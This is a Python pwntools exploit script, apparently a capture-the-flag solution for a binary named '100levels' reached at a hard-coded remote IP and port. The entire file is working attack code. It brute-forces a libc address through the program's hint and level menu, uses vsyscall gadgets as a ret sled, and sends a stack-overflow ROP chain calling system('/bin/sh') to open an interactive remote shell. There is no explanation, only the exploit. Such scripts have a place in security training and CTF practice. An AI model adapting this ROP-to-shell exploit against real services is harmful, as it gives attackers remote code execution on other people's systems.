from pwn import *
sh = remote("111.198.29.45", "46305")
libc = ELF('./libc.so')
elf = ELF('./100levels')


def go(levels, more):
    sh.recvuntil('Choice:\n')
    sh.sendline('1')
    sh.recvuntil('levels?\n')
    sh.sendline(str(levels))
    sh.recvuntil('more?\n')
    sh.sendline(str(more))


def level(ans):
    sh.recvuntil('Answer:')
    sh.send(ans)


def hint():
    sh.recvuntil('Choice:\n')
    sh.sendline('2')


count = 0
leak = 0x700000000390
for i in range(0x8, 0x0, -1):
    for j in range(0xf, -0x1, -1):
        hint()
        temp = leak + j * (1 << (i + 2) * 4)
        go(0, -temp)
        result = sh.recvline()
        print result
        if 'Coward' not in result: break
    leak = temp
    print hex(leak)
    for k in range(99):
        level(p64(0) * 5)
    level(p64(0xffffffffff600400) * 35)

system_adr = leak + 0x1000
print "system_adr: " + hex(system_adr)
system_off = libc.symbols['system']
libc_base = system_adr - system_off
print "libc_base: " + hex(libc_base)
binsh_adr = libc_base + libc.search('/bin/sh\x00').next()
poprdi_ret = libc_base + 0x21102
go(0, 1)
payload = 'a' * 0x30 + 'b' * 8 + p64(poprdi_ret) + p64(binsh_adr)
payload += p64(system_adr)
sh.send(payload)
sh.interactive()